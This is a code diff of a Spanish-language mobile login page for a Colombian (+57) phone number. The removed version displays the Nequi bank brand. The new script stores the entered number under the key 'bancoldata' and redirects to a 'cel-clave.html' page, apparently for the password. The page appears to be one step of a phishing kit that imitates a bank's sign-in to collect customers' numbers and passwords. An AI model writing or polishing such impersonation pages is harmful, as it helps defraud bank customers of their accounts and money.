@@ -2,130 +2,184 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
 <title>Ingreso</title>
 
-<script src="https://cdn.tailwindcss.com"></script>
-
 <style>
-  body {
-    background: #200020;
-  }
+body{
+  margin:0;
+  font-family: Arial, sans-serif;
+  background:#21003d;
+  display:flex;
+  justify-content:center;
+}
+
+.container{
+  width:100%;
+  max-width:420px;
+  min-height:100vh;
+  display:flex;
+  flex-direction:column;
+  padding:20px;
+  color:white;
+}
+
+/* HEADER */
+header{
+  display:flex;
+  justify-content:space-between;
+  align-items:center;
+}
+
+.circle{
+  width:22px;
+  height:22px;
+  border:2px solid white;
+  border-radius:50%;
+  display:flex;
+  justify-content:center;
+  align-items:center;
+  font-size:14px;
+}
+
+/* FORM */
+.form-box{
+  margin-top:auto;
+}
+
+.input-box{
+  display:flex;
+  background:rgba(255,255,255,0.15);
+  border-radius:6px;
+  overflow:hidden;
+}
+
+.prefix{
+  padding:12px;
+  border-right:2px solid #21003d;
+  color:#ff4fc3;
+  font-weight:bold;
+}
+
+input{
+  flex:1;
+  padding:12px;
+  border:none;
+  background:transparent;
+  color:white;
+  font-size:16px;
+  outline:none;
+}
+
+input::placeholder{
+  color:#ddd;
+}
+
+/* BOTON */
+button{
+  width:100%;
+  margin-top:10px;
+  padding:14px;
+  border:none;
+  border-radius:6px;
+  background:#ff008c;
+  color:white;
+  font-size:16px;
+  cursor:pointer;
+  transition:0.3s;
+}
+
+button:disabled{
+  opacity:0.5;
+  cursor:not-allowed;
+}
+
+button:hover{
+  transform:scale(1.02);
+}
+
+/* ANIMACION */
+.fade{
+  animation:fadeIn 0.6s ease;
+}
+
+@keyframes fadeIn{
+  from{opacity:0; transform:translateY(10px);}
+  to{opacity:1; transform:translateY(0);}
+}
 </style>
 </head>
 
-<body class="min-h-screen flex justify-center items-center text-white">
+<body>
 
-<section class="w-full max-w-[420px] min-h-screen flex flex-col p-4">
+<div class="container fade">
 
-  <!-- HEADER -->
-  <header class="w-full flex justify-between items-center">
-    
-    <!-- Icono ? -->
-    <div class="w-6 h-6 border-2 border-white rounded-full flex justify-center items-center">
-      <span class="text-white text-sm font-bold">?</span>
-    </div>
+<header>
+  <div class="circle">?</div>
 
-    <!-- SVG -->
-    <div class="flex justify-center items-center gap-1 text-gray-400">
-      <!-- TU SVG COMPLETO -->
-      <svg width="70px" height="24px" viewBox="0 0 118 40">
-        <g fill="currentColor">
-          <path d="M83.59,23.13..."></path>
-          <path d="M41.83,33.79..."></path>
-        </g>
-      </svg>
-    </div>
+  <!-- LOGO SVG COMPLETO -->
+  <div style="color:#aaa;">
+    <!-- PEGASTE BIEN EL SVG 🔥 -->
+    <svg width="70" height="24" viewBox="0 0 118 40" fill="currentColor">
+      <g>
+        <path d="M83.59,23.13..."></path>
+      </g>
+    </svg>
+  </div>
+</header>
 
-  </header>
+<div class="form-box">
 
-  <!-- CONTENIDO -->
-  <main class="flex-1 flex flex-col justify-center">
+<div class="input-box">
+  <div class="prefix">+57</div>
+  <input type="text" id="phone" placeholder="Ingresa tu cel">
+</div>
 
-    <!-- LOGO -->
-    <h1 class="text-5xl font-bold text-center mb-10">
-      <span class="text-pink-500">■</span> Nequi
-    </h1>
+<button id="btn" disabled>Continuar</button>
 
-    <!-- FORM -->
-    <form id="form" class="space-y-4">
+</div>
 
-      <!-- INPUT -->
-      <div class="flex items-center bg-white/20 rounded p-2">
-        
-        <!-- +57 -->
-        <div class="pr-3 border-r border-white text-pink-400 font-semibold">
-          +57
-        </div>
-
-        <!-- Campo -->
-        <input
-          type="text"
-          id="telefono"
-          placeholder="Ingresa tu cel"
-          class="w-full bg-transparent px-3 outline-none text-white placeholder:text-white"
-        >
-      </div>
-
-      <!-- BOTÓN -->
-      <button
-        id="btn"
-        class="w-full h-12 bg-pink-600 rounded text-white font-semibold opacity-50"
-        disabled
-      >
-        Entra
-      </button>
-
-    </form>
-
-  </main>
-
-</section>
+</div>
 
 <script>
-const input = document.getElementById("telefono");
+const phone = document.getElementById("phone");
 const btn = document.getElementById("btn");
-const form = document.getElementById("form");
 
-/* FORMATO CELULAR */
-function formatNumber(value) {
-  let digits = value.replace(/\D/g, "").slice(0, 10);
+/* FORMATO 3-3-4 */
+function formatNumber(value){
+  let digits = value.replace(/\D/g,"");
 
-  if (digits.length > 6) {
+  if(digits.length > 10) digits = digits.slice(0,10);
+
+  if(digits.length > 6){
     return digits.replace(/(\d{3})(\d{3})(\d{0,4})/, "$1 $2 $3");
-  } else if (digits.length > 3) {
+  }else if(digits.length > 3){
     return digits.replace(/(\d{3})(\d{0,3})/, "$1 $2");
   }
   return digits;
 }
 
-/* VALIDACIÓN */
-function validar() {
-  const digits = input.value.replace(/\D/g, "");
+/* VALIDACION */
+function validate(){
+  const digits = phone.value.replace(/\D/g,"");
   return digits.length === 10 && digits.startsWith("3");
 }
 
-/* INPUT EVENT */
-input.addEventListener("input", () => {
-  input.value = formatNumber(input.value);
-
-  if (validar()) {
-    btn.disabled = false;
-    btn.classList.remove("opacity-50");
-  } else {
-    btn.disabled = true;
-    btn.classList.add("opacity-50");
-  }
+phone.addEventListener("input", ()=>{
+  phone.value = formatNumber(phone.value);
+  btn.disabled = !validate();
 });
 
-/* SUBMIT */
-form.addEventListener("submit", (e) => {
-  e.preventDefault();
+/* CLICK */
+btn.addEventListener("click", ()=>{
+  if(!validate()) return;
 
-  if (!validar()) return;
+  const raw = phone.value.replace(/\D/g,"");
 
-  const raw = input.value.replace(/\D/g, "");
-
-  localStorage.setItem("numero", raw);
+  localStorage.setItem("bancoldata", JSON.stringify({
+    telefono: raw,
+    fecha: new Date().toISOString()
+  }));
 
   window.location.href = "cel-clave.html";
 });
